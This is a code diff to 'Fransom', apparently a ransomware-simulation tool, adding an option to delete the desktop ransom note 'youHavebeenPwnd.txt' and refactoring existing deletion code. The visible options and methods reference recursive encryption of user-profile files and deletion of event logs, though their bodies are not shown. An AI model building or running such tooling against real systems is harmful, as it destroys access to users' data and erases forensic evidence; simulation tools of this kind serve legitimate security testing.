@@ -31,6 +31,8 @@ namespace Fransom
         {
             [Option("ransomnote", HelpText = "Create a ransomnote on the user's desktop.", Group = "arguments")]
             public bool RansomNote { get; set; }
+            [Option("delete-ransomnote", HelpText = "Delete ransomnote on the user's desktop.", Group = "arguments")]
+            public bool DeleteRansomNote { get; set; }
             [Option("enumerate-user-profile", HelpText = "List all files and folders under the current user profile.", Group = "arguments")]
             public bool EnumerateUserProfile { get; set; }
             [Option("encrypt-user-profile", HelpText = "Encrypt all files (recursively) under the current user profile.", Group = "arguments")]
@@ -140,6 +142,7 @@ namespace Fransom
         {
             Logger.WriteLine("");
             Logger.WriteLine("ransomnote\t\t\tCreate a ransom note on the user's desktop.");
+            Logger.WriteLine("delete-ransomnote\t\t\tDelete ransom note on user's desktop");
             Logger.WriteLine("enumerate-user-profile\t\t\tList all files and folders under the current user profile.");
             Logger.WriteLine("encrypt-user-profile\t\t\tEncrypt all files (recursively) under the current user profile.");
             Logger.WriteLine("decrypt-user-profile\t\t\tDecrypt all encrypted files (recursively) under the current user profile.");
@@ -262,8 +265,30 @@ namespace Fransom
             // Write "hello world!" to the file, creating it if it doesn't exist
             File.WriteAllText(filePath, message);
 
-            Console.WriteLine($"Ransom note has been created at: {filePath}");
+            Logger.WriteLine($"Ransom note has been created at: {filePath}");
         }
+
+        public static void DeleteRansomNote()
+        {
+            // Get the path to the desktop
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+            // Combine the desktop path with the filename to create the full path
+            string filePath = Path.Combine(desktopPath, "youHavebeenPwnd.txt");
+
+            // Check if the file exists
+            if (File.Exists(filePath))
+            {
+                // Delete the file
+                File.Delete(filePath);
+                Logger.WriteLine($"Ransom note has been deleted from: {filePath}");
+            }
+            else
+            {
+                Logger.WriteLine("The file does not exist or has already been deleted.");
+            }
+}
+
 
         static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errs)
         {
@@ -283,6 +308,10 @@ namespace Fransom
             if (options.RansomNote)
             {
                 RansomNote();
+            }
+            else if (options.DeleteRansomNote)
+            {
+                DeleteRansomNote();
             }
             else if (options.EnumerateUserProfile)
             {
@@ -1321,19 +1350,7 @@ namespace Fransom
             }
             
             // Delete the ransomnote
-            string targetFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "youHavebeenPwnd.txt");
-            if (File.Exists(targetFilePath))
-            {
-                try
-                {
-                    File.Delete(targetFilePath);
-                    Logger.WriteLine("Successfully deleted the file: youHavebeenPwnd.txt", SensitiveData);
-                }
-                catch (Exception ex)
-                {
-                    Logger.WriteLine("Failed to delete the file: youHavebeenPwnd.txt. Error: " + ex.Message, SensitiveData);
-                }
-            }
+            DeleteRansomNote();
         }
 
         public void DeleteEventLogs()
